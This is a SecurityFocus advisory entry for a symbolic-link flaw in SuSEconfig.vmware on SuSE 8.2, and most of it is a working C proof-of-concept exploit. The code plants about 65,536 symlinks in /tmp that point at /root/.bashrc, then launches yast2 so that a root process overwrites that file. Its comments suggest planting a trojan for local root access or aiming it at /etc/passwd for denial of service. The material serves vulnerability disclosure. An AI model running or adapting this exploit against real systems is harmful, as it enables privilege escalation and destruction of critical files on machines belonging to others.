source: http://www.securityfocus.com/bid/8778/info

A problem exists in the SuSEWM configuration file used by SuSEConfig. Because of this, it may be possible for a local attacker to gain elevated privileges.

/*
 * Proof of Concept for SuSEconfig.vmware Symbolic Link. 
 * Tested on SuSE 8.2.
 * Nash Leon  - nashleon@yahoo.com.br
 *
 * Reference: 
 * http://www.security.nnov.ru/search/document.asp?docid=5216
 *
 * We Need Yast2 for elevation privilege(or wait root run then).
 * 
 * This sample create file /root/.bashrc in Suse 8.2. 
 * If you use this with kdeglobals vulnerability, you can install trojan 
 * horse in bashrc(local root is possible). Denial of Service too,
 * if you define target file /etc/passwd or other.
 *
 *
 * Thanks for Mercenaries's Club
 * http://cdm.frontthescene.com.br
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

#define  ERROR   -1
#define  TARGET  "/root/.bashrc" /* Change this for other attack */

int main(int argc, char *argv[]){
int i, first, last;
char buffer[60];


fprintf(stdout,"Proof of Concept for Symbolic Link in SuSEconfig.vmware - Suse 8.2\n");
fprintf(stdout,"Mercenaries's Club - http://cdm.frontthescene.com.br\n");


/* We don't need to get Current PID. Suse 8.2 is very poor em security
 * against symbolic link attacks.
 * There is not protect for creation of symbolic links in
 * /tmp. We can create 65535 files with symbolic link
 * if We wanted(this is 100% accurate).
 */

//first = getpid();


first = 0;

/* We don't need to get possible PID for Yast2 sw_single run
 * SuSE.vmware because SuSE 8.2 don't limit creation of 
 * symbolic links.
 */

last = 65535;

for(i = first; i < last + 1; i++){
bzero(buffer,50);
snprintf(buffer,59,"ln -s %s /tmp/susewm.%d",TARGET,i); // Are you hacker?:)
system(buffer);
 }



/* Run Yast2, note this need X-Window and permission.
 * This code is not for script kiddies.
 * Other attacks are possible.
 *
 * In Yast2, you will try uninstall some program.
 * When Yast2 run update tool, it will run SuSEconfig.vmware
 * as root and the specified file will be overwrite.
 */

system("/sbin/yast2 'sw_single'");

return 0;
}